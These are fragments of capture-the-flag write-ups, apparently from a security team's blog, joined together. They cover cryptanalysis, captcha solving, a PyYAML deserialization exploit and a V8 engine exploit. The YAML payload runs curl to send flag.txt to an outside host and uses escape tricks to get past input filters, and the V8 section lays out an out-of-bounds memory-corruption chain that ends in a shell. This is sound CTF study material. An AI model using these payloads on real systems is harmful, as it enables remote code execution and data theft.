They are not included here for simplicity)\nHowever, we are unable to recover the message from sampling three ciphertexts in 100 rounds (it should happen in around 27 rounds). The reason is the message isn't small enough for Coppersmith's attack. Hence, we are sampling more ciphertexts (from 3 to 5) and the attack worked:\nn = 5 attempt_count = 0 while True: random.shuffle(pairs) subpairs = pairs[:n] attempt_count += 1 if attempt_count % 100 == 0: print(f\u0026#39;Attempt {attempt_count}\u0026#39;) m = attempt(subpairs) if m is None: continue m = int(m) flag = m.to_bytes(length=(m.bit_length() + 7)//8, byteorder=\u0026#39;big\u0026#39;) print(subpairs) print(flag) break # b\u0026#39;3k{H4st4d_St1ll_Rul3S}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39; Note that there is a chance to return m^2 or m^3.

We apply a similar concept here, but we hope any one of them could solve the captcha even the previous model fails to do. Originally, we think of bruteforce the top 2 decision of each character, but turns out it requires 32 query, which we may run out of time...\nTo train up different models, I tried to play with the different parameters like batch size, size of evaluation set and different training set, etc.\nI also collected extra dataset by save those captcha we solved with only 1 model and denote as good set, those with more than 2 models as benign set. We feed these data to our training script to train new model and deploy it to collect more new samples. In total, we collected 120k samples and trained 8 models through this iterating process.\nThe strategy for adding new samples to the dataset as follows, we tried to extend our dataset upto about 90k with both good set and benign set. And the last 20k is from the benign set. We also trained several models with different numbers of data samples during our data collection procedures.\nThe best result with five models is 169 levels, while I can attain reach level 225 with eight models. For 5 models to 8 models ensemble, we improve from solving 40 level before fail to average solving 60 level. However, it still very far away from solving 500 within 10 minutes.\nAt the end, my god like teammate @mystiz613 come up with an idea to solve as a hybird approach (DL model + human)... That is, if a captcha can't be solve with 8 of my models, I will do it myself...\nAfter 3 trials (once timeout at 495 lv, once at 365 lv), we succesfully capture the flag with ~90 second left by luck (manually solved ~10 times in total)...\n Level 497 is not high enough Invalid captcha Invalid captcha Invalid captcha Invalid captcha Invalid captcha Level 498 is not high enough Level 499 is not high enough uiuctf{i_knew_a_guy_in_highschool_that_could_read_this} Credits 90% of work from @mystiz613, 10% from me.\nReflection I guess there are better way to solve it with full automation right? After submitted the flag, I tried to do cause analysis why is such hard to solve with full automation (I know that I am too weak, please don't laugh at me 😭). These are my observations:\nDuplicate characters Continuous duplicate character is hard to solve with my model.\nJGGSS:\n YJKYY:\n J, R, P and Y Due to similar shape to other characters or is formed by more than 2 components...\nYJKYY:\n JPSCB:\n FDSEJ:\n VJGJJ:\n Similar glyphs In fact, most of cases I solve manually the edit distance is between 1-2 characters and the problematic region are share by different models...\nFor example PTJYZ:\n Option available:\n  That is it!

(With the POC here)\nThe CVE-2020-1747 exploits the fact that user can input a object with a customized extend function, so that after the object is constructed (with python/object/new / python/object/apply), it can trigger the function extend as it is used by the constructor as below:\ndef construct_python_object_apply(self, suffix, node, newobj=False): ... instance = self.make_python_instance(suffix, node, args, kwds, newobj) if state: self.set_python_instance_state(instance, state) if listitems: instance.extend(listitems) if dictitems: for key in dictitems: instance[key] = dictitems[key] return instance While the format of python/object/apply can supply states for the object, we can use python/name to reference a python internal function (exec, eval etc). We cannot use an module function as . and _ is blocked, so the CVE PoC cannot be used. (and it used apply, which is blocked by FullConstructor)\n# !!python/object/apply # (or !!python/object/new) # args: [ ... arguments ... ] # kwds: { ... keywords ... } # state: ... state ... # listitems: [ ... listitems ... ] # dictitems: { ... dictitems ... } # or short format: # !!python/object/apply [ ... arguments ... ] The 5.3.1 fixes also blocked the key extend and ^__.*__$ to disallow setting those key with the state parameter.\nWe discovered that we can use python/object/new with type constructor (type is a type...) to create new types with some customized internal state. With this, we can bypass the state key block mechanism and freely set our object to something like this:\n!!python/object/new:type args: [\u0026#34;z\u0026#34;, !!python/tuple [], {\u0026#34;extend\u0026#34;: !!python/name:exec }] With this we can put our commands to listitems, and the constructor will call instance.extend(listitems), thus finish our RCE exploit.\nFull payload:\n!!python/object/new:type args: [\u0026#34;z\u0026#34;, !!python/tuple [], {\u0026#34;extend\u0026#34;: !!python/name:exec }] listitems: \u0026#34;\\x5f\\x5fimport\\x5f\\x5f(\u0026#39;os\u0026#39;)\\x2esystem(\u0026#39;curl -POST mil1\\x2eml/jm9 -F x=@flag\\x2etxt\u0026#39;)\u0026#34; (We changed _ to \\x5f and . to \\x2e to bypass the regex limitation)\nThe intended solution uses map as a type (as it is a type in Python 3):\n!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ \u0026#39;PAYLOAD_HERE\u0026#39; ]]] This is essentially the python code tuple(map(eval, \u0026quot;PAYLOAD\u0026quot;))), and this works as map and tuple are both class constructor (so it doesnt use any function as apply calls).\nThanks for the author for such cool challenge (basically used a 0day for the CTF challenge).\n","permalink":"https://b6a.black/posts/2020-07-22-uiuctf-deserializeme/","summary":"Update: It was assigned as CVE-2020-14343 after the contest.\n This was a fun challenge exploiting a deserialize service in Python.\nThe server is using pyYAML and Flask, with the source code below:\nfrom flask import Flask, session, request, make_response import yaml import re import os app = Flask(__name__) app.secret_key = os.urandom(16) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#34;POST\u0026#34;]) def pwnme(): if not re.fullmatch(b\u0026#34;^[\\n --/-\\]a-}]*$\u0026#34;, request.data, flags=re.MULTILINE): return \u0026#34;Nice try!\u0026#34;, 400 return yaml.load(request.data) if __name__ == \u0026#39;__main__\u0026#39;: app.","title":"UIUCTF 2020: deserializeme"},{"content":"Challenge Summary  Tom Nook is testing a new encryption scheme for nookphones, but it seems to be a bit faulty... can you break it?\n nookcrypt is a netcat service that have no source code released.

Define $C_i = (x_i, y_i)$ be the ciphertexts of some message $m_i$. By direct substitution, we have $y_i^2 \\equiv x_i^3 + ax_i + b\\ (\\text{mod}\\ p)$ for all $i$.\nAssume that we have three ciphertexts. We can deduce that:\n $a(x_1 - x_2) \\equiv y_1^2 - y_2^2 - x_1^3 + x_2^3 \\ (\\text{mod}\\ p)$ and $a(x_2 - x_3) \\equiv y_2^2 - y_3^2 - x_2^3 + x_3^3 \\ (\\text{mod}\\ p)$.  From above, we know $(y_1^2 - y_2^2 - x_1^3 + x_2^3)(x_2 - x_3) - (y_2^2 - y_3^2 - x_2^3 + x_3^3)(x_1 - x_2)$ is a multiple of $p$.\nSo we have collected a bunch of \u0026quot;multiples of $p$\u0026quot; and take their gcd. We have recovered that $p = 340282366762482138434845932244680310783$.\nThen it is rather obvious to recover $a = 284470887156368047300405921324061011681$ and $b = 126188322377389722996253562430093625949$.\nQuestion.

Since this is $G$, we can simply search this on Google:\n Ta-da :tada: - it is the generator for curve secp128r2. You would think this is a ta-da moment, I would say that this is a facepalm moment. I could spent much less time on recovering the parameters in such a way.\nWell, I was even more confused to notice that is a secure curve. I personally don't have a backdoor of secp128r2 (I am much appreciated if you tell me if you do) and thought the challenge isn't doable.\nPart III: \u0026quot;Hint for nookcrypt (crypto 500)\u0026quot; Fours hours later the organizers released a hint in the Discord server:\n When I was being played writing an interactor with the service, I observed that there was a strange behaviour regarding to the flag encryption method:\n======================================== Welcome to NookCrypt! Here we use fancy elliptic curve encryption to keep your messages safe! Try it out! ======================================== 1. get (encrypted) flag 2. encrypt message 3. quit ======================================== Option: 1 err Oh. So the error was caused by the cosmic ray. Okay.\nDid you really get it instantly when the hint is announced? No.  Part IV: Somebody made a breakthrough Ten hours later, somebody from Discord claimed that he has a strange observation:\n Who was the somebody? Me.  We made a bunch of assumptions. Cutting the crap, we assumed that the same generator $G = (x_G, y_G)$ is being multipled in a same way, except that the curve is operated on new modulo $p'$. This matches the author's statement regarding on the prime being corrupted.\nHowever, obviously, it is very likely that $G$ may not be a point the above curve. Luckily (or unluckily), we can assume that it is operating on another curve $y^2 \\equiv x^3 + ax + b'\\ (\\text{mod}\\ p')$, such that $G$ is on it.\nFor now, we are given two points on this curve (the ciphertexts of the flag $F = (x_F, y_F)$ and the message hello world $M = (x_M, y_M)$). Since $a$ is known we can easily recover $p'$ by:\n\\[\\begin{aligned} p' = \\text{gcd}( \u0026(y_F^2 - x_F^3 - ax_F - b') - (y_G^2 - x_G^3 - ax_G - b'), \\\\ \u0026 (y_M^2 - x_M^3 - ax_M - b') - (y_G^2 - x_G^3 - ax_G - b')) \\end{aligned} \\]\nThe order of the generator should be a large prime for an elliptic curve to be secure. Clearly this property may not hold on those new modulos struck by cosmic may. For instance, suppose that we have $p' = 340282366762482138434845932242512471141$. Since 67 is a factor of $p'$, we are indeed working on the curve $y^2 \\equiv x^3 + ax + b'\\ (\\text{mod}\\ 67)$. $G$ has a order 74, and $F = fG = 21G$. It implies that $f \\equiv 21\\ (\\text{mod}\\ 74)$.\nBy collecting a bunch of linear congruences, we can find $f$ by the Chinese Remainder Theorem.

So, our exploitation will be very straightforward. First, we will set up an array of BitInts with 0x33313131 as marking for arbitary write after we collect sufficient primitive with the OOB.\nvar tarr = new BigUint64Array(8); tarr[0] = 0x33313131n; tarr[1] = 0x32323232n; Then, we will setup an array of ArrayBuffer and trigger garbage collection to move all of this items to the oldspace. As mentioned in the doc of GC, its expected to trigger in anytime, this step can ensure the address leaked will be constant throughout the exploitation. This is essential for locating relative information and escalate to code execution (there is a better way for this chall though).\nvar ab = [] for (var i = 0; i \u0026lt; 0x200; i++) { ab.push(new ArrayBuffer(0x1337)); } var oob_str_arr = [\u0026#39;AAAAAAAA\u0026#39;,\u0026#39;BBBBBBBB\u0026#39;,\u0026#39;CCCCCCCC\u0026#39;] gc(); gc(); console.log(\u0026#39;[+] Locate relative postion of tarr\u0026#39;) We use the OOB read primitive to locate the relative position of tarr from oob_str_arr and locate one of the ArrayBuffers:\nvar tarr_ix = 0; for (var i = 0; i \u0026lt; 4000; i++) { if (oob_str_arr[0].charCodeAt(-1620000-i) == 0x33 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i-1) == 0x31 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i-2) == 0x31 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i-3) == 0x31) { tarr_ix=i; } } console.log(tarr_ix); console.log(\u0026#39;[+] Locate array buffer\u0026#39;) var ab_ix = 0; for (var i = 0; i \u0026lt; 4000; i++) { if (oob_str_arr[0].charCodeAt(-1620000-i) == 0x13 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i-1) == 0x37) { ab_ix=i; } } The above code used the memory layout as a feature for locating the ArrayBuffer from the memory:\nOriginally, we fetch the difference dynamically, but it turns out that this way not quite stable, so we just hardcode it with 650 (found base on experiment).\n// 650 is the threshold calculate from running the code in debugger // weird diff = 650 // tarr_ix-ab_ix; console.log(\u0026#39;[+] Difference : \u0026#39;) console.log(diff) Next, we will corrupt the size of the ArrayBuffer we obtained and get it back:\ntarr.fill(0x4000n,Math.floor(diff/8)-1,Math.floor(diff/8)); var corrupted_ix = 0; console.log(\u0026#39;[+] Now we corrupted one of the array size :)\u0026#39;) for (var i = 0; i \u0026lt; 0x200; i++) { if (ab[i].byteLength!=0x1337) { corrupted_ix =i; } } Our exploitation technique is simple, we will corrupt the backing store of the ArrayBuffer and point it to anywhere in the memory.\nHowever, from the deployed pointer compression12, we cannot leak address directly. We will need to leak the upper part of the address instead. While scanning the memory, we found the upper part of the address:\nThe 0x0000007 pattern exist constantly throughout runtime, so we use the below code to scan the memory in order to retrieve the upper part of the address:\nvar up_byte = 0; var lo_byte = 0; for (var i = 0; i \u0026lt; 10000; i++) { if (oob_str_arr[0].charCodeAt(-1620000-i) ==0 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i-1)==0 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i-2)==0 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i-3)==7 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i+1)\u0026gt;0 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i+2)\u0026gt;0) { up_byte = oob_str_arr[0].charCodeAt(-1620000-i+2); lo_byte = oob_str_arr[0].charCodeAt(-1620000-i+1); break; } } Thanks to the pointer compression, the step for leaking the binary base is much easier now. We can leak some pointer of d8. Then, using the CXA handler to resolve the GI abort and overwrite the free hook with system and call console.log('sh') to get the shell.

The hash takes two arguments, salt (20 bytes) and password (22 bytes). We are allowed to control the salt, whilst the goal is to find the password within 1024 queries.\nHash construction We are given a peculiar hash algorithm that generates 64-byte long hashes, which wraps of sha0, sha1, sha256 and ripemd160.\nThe hash is defined by:\n $L_0, R_0 = \\text{password}\\ |\\ \\text{salt}\\ |\\ \\text{password}$ ($L_0, R_0$ separate the 64-byte block) $L_{i+1} = L_i \\oplus h_R(R_i), R_{i+1} = R_i \\oplus h_L(L_i)$, for $i = 0, 1, ..., 15$.  Here $h_L$ and $h_R$ are the two hash algorithms that uses one of the commonly used hash algorithms based on the content. As this is a 32-byte block, if the hash algorithm itself does not consist 32 bytes, it would repeat itself until there are 32 bytes.\nSolution Part I: Repeat, repeat, repeat One question that had brought up to my mind is: What if the $h_L$ and $h_R$ uses solely the 20-byte hash algorithms (i.e., all but sha256)?  Assume that 20-byte hash algorithms are used. Let's see what will happen in a round.\nDefine $s_0\\ |\\ s_1\\ |\\ ...\\ |\\ s_9 := L_i\\ | \\ R_i$ and $t_0\\ |\\ t_1\\ |\\ ...\\ |\\ t_9 := L_{i+1}\\ | \\ R_{i+1}$, where:\n $s_0, s_2, s_3, s_6, s_7, s_9, t_0, t_2, t_3, t_6, t_7, t_9$ are 8 bytes long, and $s_1, s_4, s_5, s_8, t_1, t_4, t_5, t_8$ are 4 bytes long.  Then we have:\n $t_0\\ |\\ t_1\\ |\\ ...\\ |\\ t_4 = s_0\\ |\\ s_1\\ |\\ ...\\ |\\ s_4\\ |\\ h_R(s_5\\ |\\ s_6\\ |\\ ...\\ |\\ s_9)$, and $t_5\\ |\\ t_6\\ |\\ ...\\ |\\ t_9 = s_5\\ |\\ s_6\\ |\\ ...\\ |\\ s_9\\ |\\ h_L(s_0\\ |\\ s_1\\ |\\ ...\\ |\\ s_4)$.  However, since the first and last 12 bytes of $h_R(\\cdot)$ are equal, we have\n $s_0 \\oplus t_0 = s_3 \\oplus t_3$, and $s_1 \\oplus t_1 = s_4 \\oplus t_4$.  The assumption applies on $h_L(\\cdot)$ as well. Thus we have\n$s_5 \\oplus t_5 = s_8 \\oplus t_8$, and $s_6 \\oplus t_6 = s_9 \\oplus t_9$.  If we define $L_0, R_0$ by $a_0, a_1, \u0026hellip;, a_9$ and $L_{16}, R_{16}$ by $b_0, b_1, \u0026hellip;, b_9$ (their lengths are respectively equal to $s_0, s_1, \u0026hellip;, s_9$), we still have the below properties:\n $b_0 \\oplus b_3 = a_0 \\oplus a_3$, $b_1 \\oplus b_4 = a_1 \\oplus a_4$, $b_5 \\oplus b_8 = a_5 \\oplus a_8$, and $b_6 \\oplus b_9 = a_6 \\oplus a_9$.   Part II: What does it mean? Let's look back how $L_0, R_0$ is defined - $\\text{password}\\ |\\ \\text{salt}\\ |\\ \\text{password}$. This gives us two more properties:\n$a_0 = a_7, a_1 = a_8, a_2 = a_9$ (derived from passwords), and we can control the values of $a_3, a_4, a_5, a_6$.  So... assuming that $h_L$ and $h_R$ uses solely the 20-byte hash algorithms, we can effectively find the password (namely $a_0, a_1, a_2$):\n $a_0 = a_3 \\oplus b_0 \\oplus b_3$, $a_1 = a_4 \\oplus b_1 \\oplus b_4$ and $a_2 = a_9 = a_6 \\oplus b_6 \\oplus b_9$.  Part III: But the assumption is too good to be true! As stated from the title, the assumption is quite hard to satisfy. What we need is, in each of the 16 rounds, $h_L$ and $h_R$ needs to pick an 20-byte hash algorithm instead of the 32-byte hash algorithm... Very difficult isn't it?\nThe answer is not really. The probability to use 20-byte hash algorithms all along is $0.75^{32}\\approx 0.000145257$, which is approximately one out of 10000. We can visit the oracle 10 times, in average, to compute the password from the hash algorithm.\nIt is very easy to know when we had the hash algorithm. From properties 2 and 3, we have:\n\\[b_1 \\oplus b_4 \\oplus b_5 \\oplus b_8 = a_1 \\oplus a_4 \\oplus a_5 \\oplus a_8 = a_4 \\oplus a_5.\\]\nWriting the exploit script solving the challenge, we have the flag: PTBCTF{420199e572e685af8e1782fde58fd0e9}.\nAvec? (Cryptanalysis; 856 points) Solved by harrier.\nChallenge Summary This is a interesting question where we are given a ciphertext, encrypted using AES-GCM, with key and nonce generated by polish_key(os.urandom(8)) and concat itself. The key and nonce is not provided though, so we have to somehow reverse the polish_key process to know more about the key and nonce.\nSolution I first thought this is a GCM nonce collision problem, but the 12 bytes nonce and nonce generation rejects this thought.\nThe polish_key function is the following:\ndef polish_key(key): key = bytes_to_long(key[::-1]) key = GF(2**64).fetch_int(key) key = key ** 0xbcafffff435 key = long_to_bytes( key.integer_representation() )[::-1] assert len(key) == 8 return key Which 0xbcafffff435 is can be factored into $3\\times5\\times7\\times257\\times3019\\times65537$. Knowing that $3^{32} - 1 = 3\\times5\\times7\\times257\\times65537$, the key is of order $3^{32}+1$ (or a factor of it). Hence, the entropy for key and nonce are 32 bits. Exhausting both of them at the same time requires $2^{64}$ trials... or really?\nBecause the cipher is under GCM and with a known AAD, given a key $k$ and a ciphertext $c$, we can compute $\\text{GHASH}_{k,c}(\\text{AAD})$.\nConsider the GCM mode with its tag generation. The tag generation is given by $\\text{tag} = E_k(\\text{nonce}) \\oplus \\text{GHASH}_{k,c}(\\text{AAD})$. Therefore, with known key $k$, one can find out the key-correspondent nonce by $\\text{nonce} = D_k(\\text{tag} \\oplus \\text{GHASH}_{k,c}(\\text{AAD}))$.\nTherefore we can exhaust the key $k$ with $2^{32} + 1$ trials, for each key $k$ find its corresponding $nonce$ and see whether it is the correct one.\nWe can even make it quickly by identifying the $\\text{nonce}$ should end with \\x00\\x00\\x00\\x01 with this method, as it is using a 12-byte nonce.\nWe initially use Sage to deal with the challenge, but it was way too slow (to generate the possible keys) and decided to use Python instead. But we don't want to use other language other than Sage to generate the keys...\nSo what we have done is a simple multi-thread Sage key generator and a Python solver. And it was wayyyyyyyyyyyy too slow... even with pypy.\nBoth the key generator and the pypy solver are terribly slow. I cannot find a simple GHASH implementation to do the brute-forcing part. Computing $2^{16}$ keys takes me more than 3 mins in pypy... I just wanted to use something fast to test through the keys. BearSSL saids it can process \u0026gt;1000MBps according to its benchmark. Maybe I should use a language with fast compiled code.\nI am a Rustacean, so why not to do it in Rust? The result is blazingly fast. It could be solved within an hour with a 64-core computer (from one of my teammates). Sage was then the bottleneck, and thus I did not bother to improve the performance of the Rust solver.\nI should use Rust to generate keys to speedup the whole thing, but anyway, we solved it! :)\nWrong Ring (Cryptanalysis; 936 points) Solved by Mystiz.\nChallenge Summary I personally see this is a cumbersome math. One of my teammates pointed out that this is similar to a ring-LWE. But anyway, knowing that is a ring-LWE does not help much.\nOkay, let's get back on track. A secret polynomial, $S$, is generated to derive the key. We are given eight polynomial pairs of $(A_k, B_k)$ such that $B_k(x) \\equiv A_k(x)S(x) + \\varepsilon_k(x)\\ (\\text{mod}\\ p(x))$, where $\\varepsilon_k$ is an error polynomial and $p(x) = x^{256} + 1486$.\nSolution Part I: Complicating the problem a bit Let's make the polynomial concrete! Define:\n\\[A_k(x) = \\sum_{i=0}^{255} a_{ki} x^i, B_k(x) = \\sum_{i=0}^{255} b_{ki} x^i, \\varepsilon_k(x) = \\sum_{i=0}^{255} e_{ki} x^i, S(x) = \\sum_{i=0}^{255} s_i x^i.\\]\n$a_{ki}, b_{ki}, s_i$ are all integers in the set $[0, 1486]$, while $e_{ki}$ are small real numbers.\nThen we have\n\\[\\begin{aligned} \\sum_{i=0}^{255} b_{ki} x^i \u0026\\equiv \\left(\\sum_{i=0}^{255} a_{ki} x^i\\right)\\left(\\sum_{i=0}^{255} s_i x^i\\right) + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{510}\\left(\\sum_{j=\\text{max}(0,i-255)}^{\\text{min}(255,i)} a_{kj}s_{i-j}\\right)x^i + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=\\text{max}(0,i-255)}^{\\text{min}(255,i)} a_{kj}s_{i-j}\\right)x^i + \\sum_{i=256}^{510}\\left(\\sum_{j=\\text{max}(0,i-255)}^{\\text{min}(255,i)} a_{kj}s_{i-j}\\right)x^i + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=0}^i a_{kj}s_{i-j}\\right)x^i + \\sum_{i=256}^{510}\\left(\\sum_{j=i-255}^{255} a_{kj}s_{i-j}\\right)x^i + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=0}^i a_{kj}s_{i-j}\\right)x^i - 1486\\sum_{i=256}^{510}\\left(\\sum_{j=i-255}^{255} a_{kj}s_{i-j}\\right)x^{i-256} + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=0}^i a_{kj}s_{i-j}\\right)x^i - 1486\\sum_{i=0}^{254}\\left(\\sum_{j=i+1}^{255} a_{kj}s_{i-j+256}\\right)x^{i} + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=0}^i a_{kj}s_{i-j} - 1486 \\sum_{j=i+1}^{255} a_{kj}s_{i-j+256} + e_i\\right)x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=0}^i a_{k,{i-j}}s_j - 1486 \\sum_{j=i+1}^{255} a_{k,i-j+256}s_j + e_i\\right)x^i \\end{aligned}\\]\nExplanations: Under modulo $p(x)$, $x^{256} = -1486$ - so we have $$\\sum_{i=256}^{510}\\left(\\sum_{j=i-255}^{255} a_{kj}s_{i-j}\\right)x^i = - 1486\\sum_{i=256}^{510}\\left(\\sum_{j=i-255}^{255} a_{kj}s_{i-j}\\right)x^{i-256}.$$  Very complicated right? Yes... But we have a conclusion for this part:\nFor each $i = 0, 1, \u0026hellip;, 255$ and $k = 1, 2, \u0026hellip;, 8$, we have: $$b_{ki} = \\sum_{j=0}^i a_{k,{i-j}}s_j - 1486 \\sum_{j=i+1}^{255} a_{k,i-j+256}s_j + e_i.$$  Part II: An insight I have noticed that the coefficients for $x^{240}, x^{241}, ..., x^{255}$ in the error polynomial would be very small (less than 0.1 in magnitude). So why don't we compare the coefficients directly?\nFor each $i = 240, 241, ..., 255$ and $k = 1, 2, ..., 8$, we have a corresponding equation:\n\\[\\text{round}(b_{ki}) = \\sum_{j=0}^i a_{k,{i-j}}s_j - 1486 \\sum_{j=i+1}^{255} a_{k,i-j+256}s_j.\\]\nSince there are 256 unknowns ($s_0, s_1, ..., s_{255}$) and 256 equations, we can hopefully solve the equation. This gives us the key, hence the flag.\nLOTR (Cryptanalysis; 936 points) Solved by Mystiz.\nChallenge Summary This is an attempt to implement an anonymous signature scheme using RSA. In short, given $m$ parties with public keys being $n_1, n_2, ..., n_m$, the signature generated by this group is defined by $(c_1, c_2, ..., c_m)$, where\n\\[\\sum_{k=1}^m \\text{RSAEncrypt}(c_k, n_k)\\equiv\\text{hash}\\ (\\text{mod}\\ 2^{256}),\\]\nand $2^{2175} + 2^{2048} \\leq c_k \\leq 2^{2176} - 2^{2048}$ for each of the $k$'s.\nThere is a catch: if $c = qn + r$ with $0 \\leq r \u0026lt; q$, $\\text{RSAEncrypt}(c, n) = qn + [r^e\\ (\\text{mod}\\ n)]$.\nSolution Part I: Simplify the challenge as much as possible $\\text{RSAEncrypt}(qn + r, n) = qn + [r^e\\ (\\text{mod}\\ n)]$ is cumbersome. Why don't we just assume $r = 0$ so that $\\text{RSAEncrypt}$ is just an identity function?\nPart II: The main dish Note: The $c_k$ and $c_k'$ defined below are multiples of $n_k$. This is what we had from the above part for the simplicity\u0026rsquo;s sake.  My approach is to generate two ciphertexts, namely, $c_k$ and $c_k'$ for the $k$-th party. In this way, we have 243 ciphertext pairs. We are looking for $x_1, x_2, ..., x_{243}\\in{0, 1}$ such that\n\\[\\bigoplus_{k=1}^m [(1 - x_k) \\text{RSAEncrypt}(c_k, n_k) + x_k \\text{RSAEncrypt}(c_k', n_k)] \\equiv \\text{hash}\\ (\\text{mod}\\ 2^{256}).\\]\nSimplifying, we have:\n\\[\\bigoplus_{k=1}^m [x_k (c_k - c_k')] \\equiv \\text{hash} \\oplus \\bigoplus_{k=1}^m c_k\\ (\\text{mod}\\ 2^{256}).\\]\nIdea: My approach is to check if one of the $2^{243}$ possible generated ciphertexts covers the target hash. If not, generate another set.  The above equation is just an linear equation! Solving it we had the values of $x_k$'s. If $x_k = 0$ we pick $c_k$, and $c_k'$ otherwise. After all we have forged a signature.\nPrimitive Obsession (Reverse Engineering; 936 points) Solved by Mystiz.\nChallenge Summary This is a crackme with a 260-byte long input.
